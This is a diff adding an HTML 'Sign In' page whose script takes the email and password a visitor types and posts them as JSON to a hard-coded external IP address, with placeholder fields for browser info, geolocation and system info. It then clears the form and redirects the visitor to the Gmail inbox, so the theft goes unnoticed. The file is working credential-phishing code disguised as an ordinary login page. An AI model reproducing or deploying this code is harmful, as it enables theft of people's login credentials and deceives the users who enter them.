@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Index</title>
+	<style type="text/css">
+		body{
+			font-family: sans-serif;
+			background-color: #22427C;
+		}
+
+		form{
+			margin: 0px auto;
+			width: 50%;
+			margin-top: 150px;
+			border: 2px solid rgb(10, 140, 140, 0.5);
+			padding: 10px 20px 20px 60px;
+			border-radius: 20px;
+			background-color: #F0E36B;
+		}
+
+		.container-form-item{
+			width: 100%;
+			display: flex;
+			margin-bottom: 20px;
+		}
+
+		.container-input{
+			width: 70%;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+		}
+
+		.input-values{
+			padding: 7px;
+			outline: none;
+			width: 90%;
+			height: 20px;
+			border: 1px solid rgba(50, 180, 180, 0.7);
+			border-radius: 10px;
+		}
+
+		label{
+			display: inline-block;
+			font-size: 18px;
+			font-weight: 700;
+			color: rgb(30, 160, 160);
+			width: 100px;
+		}
+
+		.submit{
+			font-size: 18px;
+			font-weight: 500;
+			outline: none;
+			border-style: none;
+			padding: 10px;
+			border-radius: 5px;
+			/*background-color: rgba(50, 180, 180, 0.7);*/
+			background-color: #22427C;
+			color: #F0E36B;
+		}
+		.submit:hover{
+			background-color: #F0E36B;
+			color: #22427C;
+			border: 2px solid #22427C;
+			padding: 8px 10px 8px 10px;
+		}
+
+
+	</style>
+</head>
+<body>
+	<form action="" method="POST" id="post-form">
+		<div style="display: flex; align-items: center; justify-content: center;">
+			<p style="font-size: 30px; font-weight: 900; color: rgb(30, 160, 160);">Sign In</p>
+		</div>
+		<div class="container-form-item">
+			<div>
+				<label>Email:</label>
+			</div>
+			<div class="container-input">
+				<input class="input-values" type="email" name="" id="email">
+			</div>
+		</div>
+		<div class="container-form-item">
+			<div>
+				<label>Password:</label>
+			</div>
+			<div class="container-input">
+				<input class="input-values" type="password" name="" id="password">
+			</div>
+		</div>
+		<div class="container-form-item" style="display: flex; align-items: center; justify-content: center;">
+			<input class="submit" type="submit" name="" value="Sign In">
+		</div>
+	</form>
+
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+	<script type="text/javascript">
+		$(document).on('submit', '#post-form', function(e){
+			e.preventDefault();
+			$.ajax({
+				type: 'POST',
+				// url: "http://192.168.59.83:8080/api/tutorials",
+				// url: "http://127.0.0.1:80/api/tutorials",
+				url: "http://100.25.196.242:8000/api/OPRECOAcoaSO3233",
+
+				data: JSON.stringify(
+										{
+											// "title" : $('#title').val(),
+											// "description" : $('#description').val()
+											"browser_info":"the browser info",
+											"geolocation":"0.0.0.0",
+											"sys_info":"sys_info",
+											"password":$('#password').val(),
+											"username":$('#email').val()
+										}
+									),
+
+				success: function(data){
+	               // console.log('This is data :' + data);
+	               // alert('This is data :' + data);
+	               window.location.href = "https://mail.google.com/mail/u/0/#inbox";
+				},
+
+				error: function(data){
+					console.log('Error !')
+				}
+			});
+			document.getElementById('password').value = '';
+			document.getElementById('email').value = '';
+		});
+	</script>
+</body>
+</html>
